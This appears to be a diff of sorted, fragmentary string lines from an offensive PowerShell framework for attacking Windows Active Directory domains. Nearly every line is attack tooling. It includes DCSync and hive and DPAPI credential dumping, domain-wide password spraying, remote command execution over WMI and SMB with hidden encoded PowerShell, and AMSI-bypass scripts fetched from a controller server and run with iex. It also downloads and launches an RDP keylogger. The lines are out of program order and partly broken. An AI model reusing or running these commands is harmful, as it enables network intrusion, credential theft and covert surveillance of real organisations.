@@ -1,0 +1,56 @@
+"Invoke-Command -ComputerName Server01.ferrari.local -ScriptBlock {whoami}"""
+"Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"")"
+"Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"")"
+"Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob"")"
+"Invoke-DCSync -Domain domain.local -DomainController DC01.domain.local"""
+"Invoke-DCSync -Hashcat"""
+"Invoke-DCSync Loaded | https://github.com/vletoux/MakeMeEnterpriseAdmin"""
+"Invoke-DCSync"""
+"Invoke-DpapiDump"""
+"Invoke-Expression ""`$command 2>&1 | Out-String"""
+"Invoke-GrabTheHash Loaded | https://github.com/Leo4j/Invoke-GrabTheHash';Write-Output '';New-Item 'tmpfile' -EA 0 > `$null; if(`$?){del 'tmpfile';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-GrabTheHash.ps1');`$HashGrab = Invoke-GrabTheHash | Where-Object{`$_ -match 'NTLM hash'};if(`$HashGrab){`$HashGrab}else{Write-Output '[-] HashGrab Failure'}}else{Write-Output '[-] Please move to a writable directory'}#"""
+"Invoke-GrabTheHash.ps1"","
+"Invoke-HiveDump"""
+"Invoke-Item ""$fileName"""
+"Invoke-PassSpray                             Spray an empty password across the Domain"""
+"Invoke-PassSpray -Password P@ssw0rd!         Spray a password across the Domain"""
+"Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local"""
+"Invoke-PassSpray*"" -OR $command -like ""DCSync"" -OR $command -like ""Access_Check*"" -OR $command -like ""Find-LocalAdminAccess*"" -OR $command -like ""Invoke-SessionHunter*"" -OR $command -like ""AutoMimi*"" -OR $command -like ""Mimi*""){"
+"Invoke-Patamenia.ps1"","
+"Invoke-Patamenia.ps1')"""
+"Invoke-SMBRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"""
+"Invoke-SMBRemoting -ComputerName `""$Target`"" -Command `""$Command`"""")"
+"Invoke-SMBRemoting | https://github.com/Leo4j/Invoke-WMIRemoting"""
+"Invoke-SMBRemoting.ps1"","
+"Invoke-SMBRemoting.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-WMIRemoting.ps1')"")"
+"Invoke-SessionHunter -CheckAsAdmin -FailSafe"""
+"Invoke-SessionHunter -CheckAsAdmin -UserName 'ferrari\Administrator' -Password 'P@ssw0rd!'"""
+"Invoke-SessionHunter -CheckAsAdmin"""
+"Invoke-SessionHunter -Domain ferrari.local -DomainController DC01.ferrari.local"""
+"Invoke-SessionHunter Loaded | https://github.com/Leo4j/Invoke-SessionHunter"""
+"Invoke-SessionHunter"""
+"Invoke-SessionHunter.ps1"","
+"Invoke-SessionHunter.ps1')"")"
+"Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username '.\Administrator' -Password 'P@ssw0rd!'"""
+"Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username 'ferrari\Administrator' -Password 'P@ssw0rd!'"""
+"Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"""
+"Invoke-WMIRemoting -ComputerName `""$Target`"" -Command `""$Command`"""")"
+"Invoke-WMIRemoting.ps1"","
+"Invoke-WebRequest -Uri '$($global:ServerURL)/RDPKeylog.exe' -OutFile 'C:\Users\Public\Documents\RDPLog.exe';`$process = Start-Process -FilePath 'C:\Users\Public\Documents\RDPLog.exe' -PassThru;`$processId = `$process.Id"""
+"Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList (""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" + $finalCommandBase64)}"
+"Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -Credential $cred -ArgumentList (""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" + $finalCommandBase64)}"
+Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer
+Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer -Credential $cred
+Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}
+Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue}
+Invoke-Expression `$command | Out-String
+Invoke-SMBRemoting
+Invoke-SMBRemoting -ComputerName $Computer -Command $Command
+Invoke-SMBRemoting Author: Rob LP (@L3o4j)
+Invoke-SMBRemoting {
+Invoke-WMIRemoting
+Invoke-WMIRemoting -ComputerName $Computer -Command $Command
+Invoke-WMIRemoting -ComputerName $Computer -Command $Command -Username $Username -Password $Password
+Invoke-WMIRemoting Author: Rob LP (@L3o4j)
+Invoke-WMIRemoting {
+Invoke-WebRequest -Uri $url -OutFile $destinationPath
